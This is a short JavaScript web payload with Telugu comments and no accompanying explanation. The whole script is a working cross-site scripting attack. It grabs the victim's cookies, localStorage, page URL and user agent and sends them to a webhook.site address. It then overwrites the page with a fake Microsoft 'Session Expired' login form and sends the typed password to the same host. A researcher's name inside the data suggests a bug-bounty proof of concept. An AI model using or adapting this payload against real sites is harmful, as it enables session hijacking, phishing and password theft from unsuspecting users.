
(function() {
    const webhook = "https://73764c17-b242-4f2a-84ba-88f63958a3e1.webhook.site/";

    // 1. సెషన్ డేటా సేకరించడం
    const sessionData = {
        researcher: "Ramavath Gopi Nayak",
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        location: window.location.href,
        userAgent: navigator.userAgent
    };

    // 2. డేటాను వెబ్‌హుక్‌కి పంపడం
    fetch(webhook + "?session=" + btoa(JSON.stringify(sessionData)), {
        method: 'GET',
        mode: 'no-cors'
    });

    // 3. ఫేక్ లాగిన్ ఫామ్ ఇంజెక్ట్ చేయడం (Phishing)
    document.body.innerHTML = `
        <div style="font-family: Arial; text-align: center; margin-top: 100px;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="150"><br><br>
            <h3>Session Expired</h3>
            <p>Your session has expired. Please log in again to continue.</p>
            <input type="password" id="pass" placeholder="Enter Password" style="padding: 10px; width: 250px;"><br><br>
            <button id="loginBtn" style="padding: 10px 20px; background: #0078d4; color: white; border: none; cursor: pointer;">Login</button>
        </div>
    `;

    // 4. పాస్వర్డ్ పట్టుకోవడం
    document.getElementById('loginBtn').onclick = function() {
        const password = document.getElementById('pass').value;
        const pwned = {
            target: "Microsoft Azure User",
            stolen_password: password
        };
        
        // పాస్వర్డ్ ని వెబ్‌హుక్‌కి పంపడం
        const img = new Image();
        img.src = webhook + "?creds=" + btoa(JSON.stringify(pwned));
        
        alert("System Error: Please try again later.");
        location.reload();
    };
})();
